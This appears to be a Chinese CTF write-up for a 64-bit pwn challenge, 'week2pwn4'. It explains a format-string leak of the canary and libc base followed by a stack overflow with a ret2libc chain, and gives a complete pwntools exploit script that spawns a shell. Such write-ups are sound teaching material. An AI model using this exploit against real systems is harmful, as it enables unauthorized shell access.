# week2pwn4

## 题目简述

64 位程序同时启用栈 Canary 和 NX。用户名处的格式化字符串可一次泄漏 libc 返回地址与 Canary；随后利用栈溢出原样放回 Canary，并构造 ret2libc 调用 `system("/bin/sh")`。

## 解题过程

第 25 个参数是 `__libc_start_main+243` 附近的返回地址，第 23 个参数是 Canary。用分隔串 `aaa` 可靠拆分两个十六进制泄漏，再根据配套 libc 计算基址：

~~~python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
s = remote('HOST', PORT)
libc = ELF('./libc-2.31.so')
payload = b'%25$paaa%23$p'
s.sendlineafter(b"what's your name?\n", payload)
libc_base = int(s.recv(14), 16) - libc.sym['__libc_start_main'] - 243
success('libc_base=>' + hex(libc_base))
s.recvuntil(b'aaa')
canary = int(s.recv(18), 16)
success('canary=>' + hex(canary))

pop_rdi_ret = 0x0000000000401323
ret = 0x000000000040101a
system = libc_base + libc.sym['system']
binsh = libc_base + libc.search(b'/bin/sh').__next__()
payload = (
    b'a' * 0x88 + p64(canary) + b'b' * 0x8 +
    p64(ret) + p64(pop_rdi_ret) + p64(binsh) + p64(system)
)
s.sendlineafter(b"do you know how to getshell?\n", payload)
s.interactive()
~~~

溢出布局是 `0x88` 字节填充、Canary、8 字节保存的 `rbp`，随后才是 ROP 链。单独的 `ret` 用于满足 AMD64 ABI 的 16 字节栈对齐。

## 方法总结

- 核心方法：格式串同时泄漏 Canary 和 libc，随后在保留 Canary 的前提下构造 ret2libc。
- 识别特征：程序先后存在格式化字符串和栈溢出，崩溃信息或 `checksec` 表明 Canary/NX 开启。
- 注意事项：格式化参数序号与 libc 返回地址修正常数都依赖具体二进制和运行库；解析两个连续泄漏时应使用明确分隔符。
